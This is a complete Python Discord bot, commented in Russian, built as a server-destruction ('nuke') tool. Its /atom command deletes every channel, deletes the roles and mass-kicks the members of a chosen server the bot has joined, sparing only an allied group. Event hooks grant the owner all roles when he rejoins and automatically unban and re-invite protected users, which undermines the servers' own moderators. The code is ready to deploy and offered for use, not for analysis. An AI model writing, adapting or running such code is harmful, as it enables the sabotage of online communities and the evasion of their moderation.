import discord
from discord.ext import commands
import asyncio

TOKEN = ''  # Замените на ваш токен
AUTHORIZED_USER_ID =   # Ваш ID пользователя
MAIN_SERVER_ID = 1225075859333845154
MAIN_VOICE_CHANNEL_ID = 1289694911234310155
PROTECTED_ROLES = {
    1289911579097436232,  # Гражданство
    1289962005129859082,
    1225212269541986365,
    1364002544657109072,
    1226236176298541196
}

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.bans = True
intents.voice_states = True
intents.guilds = True

bot = commands.Bot(command_prefix='/', intents=intents)

# Глобальные переменные
voice_client = None
current_page = 0
guilds_pages = []
is_performing_atom = False


async def play_music(channel, filename, loop=False):
    global voice_client
    if voice_client and voice_client.is_connected():
        await voice_client.disconnect()
    voice_client = await channel.connect()

    def after_playing(error):
        if loop and not error:
            asyncio.run_coroutine_threadsafe(play_music(channel, filename, loop), bot.loop)

    voice_client.play(discord.FFmpegPCMAudio(filename), after=after_playing)


async def stop_music():
    global voice_client
    if voice_client and voice_client.is_connected():
        await voice_client.disconnect()
        voice_client = None


async def send_dm(user, message):
    try:
        await user.send(message)
    except discord.Forbidden:
        print(f'Не удалось отправить ЛС пользователю {user.name}')


async def create_invite(guild):
    try:
        invite = await guild.text_channels[0].create_invite(max_age=300)
        return invite.url
    except:
        return "Не удалось создать приглашение"


async def has_protected_role(member):
    if member.guild.id != MAIN_SERVER_ID:
        main_guild = bot.get_guild(MAIN_SERVER_ID)
        if main_guild:
            main_member = main_guild.get_member(member.id)
            if main_member:
                return any(role.id in PROTECTED_ROLES for role in main_member.roles)
    return False


async def update_guilds_pages():
    global guilds_pages
    guilds = [g for g in bot.guilds if g.id != MAIN_SERVER_ID]
    guilds_pages = [guilds[i:i + 10] for i in range(0, len(guilds), 10)]


async def create_guild_embed(page):
    embed = discord.Embed(title=f"Выберите сервер (Страница {page + 1}/{len(guilds_pages)})")
    emoji_list = ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '🔟']

    for i, guild in enumerate(guilds_pages[page]):
        embed.add_field(name=f'{emoji_list[i]} {guild.name}', value=f'ID: {guild.id}', inline=False)

    return embed, emoji_list[:len(guilds_pages[page])]


@bot.command()
async def atom(ctx):
    if ctx.author.id != AUTHORIZED_USER_ID:
        return await ctx.send("❌ Доступ запрещен")

    if ctx.guild and ctx.guild.id == MAIN_SERVER_ID:
        return await ctx.send("❌ Команда недоступна на основном сервере")

    if not isinstance(ctx.channel, discord.DMChannel):
        return await ctx.send("ℹ️ Команда доступна только для Президента ВОСТОЧНОГО ФРОНТА")

    await handle_dm_atom(ctx)


async def handle_dm_atom(ctx):
    global current_page, is_performing_atom

    if is_performing_atom:
        return await ctx.send("⚠️ Атомная атака уже выполняется")

    main_guild = bot.get_guild(MAIN_SERVER_ID)
    owner = main_guild.get_member(AUTHORIZED_USER_ID) if main_guild else None

    if owner:
        target_channel = owner.voice.channel if owner.voice else main_guild.get_channel(MAIN_VOICE_CHANNEL_ID)
        if target_channel:
            await play_music(target_channel, "wait.mp3", loop=True)

    await update_guilds_pages()

    if not guilds_pages:
        await ctx.send("⚠️ Бот не состоит в других серверах")
        await stop_music()
        return

    current_page = 0
    await send_guild_selection(ctx)


async def send_guild_selection(ctx):
    global current_page

    embed, emoji_list = await create_guild_embed(current_page)
    message = await ctx.send(embed=embed)

    for emoji in emoji_list:
        await message.add_reaction(emoji)

    if len(guilds_pages) > 1:
        await message.add_reaction('⬅️')
        await message.add_reaction('➡️')

    await message.add_reaction('❌')

    def check(reaction, user):
        return (user == ctx.author and reaction.message.id == message.id and
                (reaction.emoji in emoji_list or reaction.emoji in ['⬅️', '➡️', '❌']))

    try:
        reaction, _ = await bot.wait_for('reaction_add', timeout=60.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send("⌛ Время выбора истекло")
        await handle_timeout()
        return

    if reaction.emoji == '❌':
        await ctx.send("❌ Команда отменена")
        await handle_timeout()
        return

    if reaction.emoji == '⬅️':
        current_page = max(0, current_page - 1)
        await message.delete()
        await send_guild_selection(ctx)
        return

    if reaction.emoji == '➡️':
        current_page = min(len(guilds_pages) - 1, current_page + 1)
        await message.delete()
        await send_guild_selection(ctx)
        return

    index = emoji_list.index(reaction.emoji)
    selected_guild = guilds_pages[current_page][index]
    await message.delete()
    await confirm_action(ctx, selected_guild)


async def confirm_action(ctx, guild):
    confirm_msg = await ctx.send(
        f"Вы выбрали: **{guild.name}**\n"
        "Подтвердите действие:\n"
        "✅ - Подтвердить\n"
        "❌ - Отменить"
    )
    await confirm_msg.add_reaction('✅')
    await confirm_msg.add_reaction('❌')

    def check(reaction, user):
        return user == ctx.author and reaction.message.id == confirm_msg.id and reaction.emoji in ['✅', '❌']

    try:
        reaction, _ = await bot.wait_for('reaction_add', timeout=60.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send("⌛ Время истекло")
        await handle_timeout()
        return

    if reaction.emoji == '✅':
        await confirm_msg.delete()
        await execute_atom_attack(guild, ctx)
    else:
        await ctx.send("❌ Действие отменено")
        await handle_timeout()


async def execute_atom_attack(guild, ctx):
    global is_performing_atom
    is_performing_atom = True

    try:
        await stop_music()
        main_guild = bot.get_guild(MAIN_SERVER_ID)
        if main_guild:
            target_channel = main_guild.get_channel(MAIN_VOICE_CHANNEL_ID)
            if target_channel:
                await play_music(target_channel, "pusk.mp3")

        # 15-секундная задержка перед началом
        await ctx.send(f"⏳ Начинаю атомную атаку на **{guild.name}** через 15 секунд...")
        await asyncio.sleep(15)

        await perform_atom(guild)

        # Ждём окончания музыки + 5 секунд
        while voice_client and voice_client.is_playing():
            await asyncio.sleep(1)

        await asyncio.sleep(5)
        await stop_music()

        await ctx.send(f"☢️ Атомная атака на **{guild.name}** завершена")
    except Exception as e:
        await ctx.send(f"⚠️ Произошла ошибка: {e}")
    finally:
        is_performing_atom = False


async def handle_timeout():
    await stop_music()
    main_guild = bot.get_guild(MAIN_SERVER_ID)
    if main_guild:
        target_channel = main_guild.get_channel(MAIN_VOICE_CHANNEL_ID)
        if target_channel:
            await play_music(target_channel, "otmena.mp3")
            await asyncio.sleep(5)
            await stop_music()


async def perform_atom(guild):
    protected_members = []
    protected_bots = []

    # Проверка участников
    for member in guild.members:
        if await has_protected_role(member):
            if member.bot:
                protected_bots.append(member)
            else:
                protected_members.append(member)

    # Удаление каналов
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f'Ошибка удаления канала: {e}')

    # Удаление ролей
    for role in guild.roles:
        try:
            if role.name != "@everyone" and not role.managed:
                # Проверка на защищенные боты
                protected_role = False
                for bot_member in protected_bots:
                    if role in bot_member.roles:
                        protected_role = True
                        break

                if not protected_role:
                    await role.delete()
                    await asyncio.sleep(0.5)
        except Exception as e:
            print(f'Ошибка удаления роли: {e}')

    # Кик участников
    for member in guild.members:
        if member not in protected_members and member not in protected_bots:
            try:
                await member.kick(reason="Атомная атака")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f'Ошибка кика участника: {e}')


@bot.event
async def on_member_join(member):
    if member.id == AUTHORIZED_USER_ID:
        roles = [role for role in member.guild.roles if role.name != "@everyone"]
        roles = [role for role in roles if role.position < member.guild.me.top_role.position]
        try:
            await member.edit(roles=roles)
            await send_dm(member, f'🔙 Вы вернулись на сервер! Вам выданы все роли.')
        except Exception as e:
            print(f'Ошибка выдачи ролей: {e}')


@bot.event
async def on_member_remove(member):
    """Срабатывает, когда пользователя кикнули или он вышел"""
    if not await has_protected_role(member):
        return

    try:
        # Пытаемся создать приглашение
        invite = await member.guild.text_channels[0].create_invite(
            max_age=86400,  # Ссылка на 24 часа
            reason="Автоматическое приглашение для защищенного пользователя"
        )

        # Отправляем в ЛС
        await send_dm(
            member,
            f"⚠️ Вас исключили с сервера **{member.guild.name}**\n"
            f"🔗 Вот ссылка для возврата: {invite.url}\n"
            f"Своих не бросаем!"
        )

    except Exception as e:
        print(f"❌ Не удалось отправить приглашение {member.name}: {e}")


@bot.event
async def on_member_ban(guild, user):
    """Срабатывает при бане пользователя"""
    if guild.id == MAIN_SERVER_ID:
        return

    if not await has_protected_role(user):
        return

    try:
        # Разбаниваем
        await guild.unban(user)

        # Создаем новое приглашение
        invite = await guild.text_channels[0].create_invite(
            max_age=86400,
            reason="Автоматический разбан защищенного пользователя"
        )

        # Отправляем в ЛС
        await send_dm(
            user,
            f"🔓 Вас разбанили на сервере **{guild.name}**\n"
            f"🔗 Вот новая ссылка для входа: {invite.url}\n"
            f"Своих не бросаем!"
        )

        # Уведомляем владельца
        owner = bot.get_user(AUTHORIZED_USER_ID)
        if owner:
            await send_dm(
                owner,
                f"🛡️ Автоматический разбан:\n"
                f"• Пользователь: {user.name} (ID: {user.id})\n"
                f"• Сервер: {guild.name}"
            )

    except Exception as e:
        print(f"❌ Ошибка разбана {user.name}: {e}")
        owner = bot.get_user(AUTHORIZED_USER_ID)
        if owner:
            await send_dm(
                owner,
                f"⚠️ Не удалось разбанить {user.name}:\n"
                f"• Ошибка: {str(e)}"
            )


@bot.event
async def on_ready():
    print(f'Бот {bot.user.name} готов к работе')
    await bot.change_presence(activity=discord.Game(name="/atom"))


bot.run(TOKEN)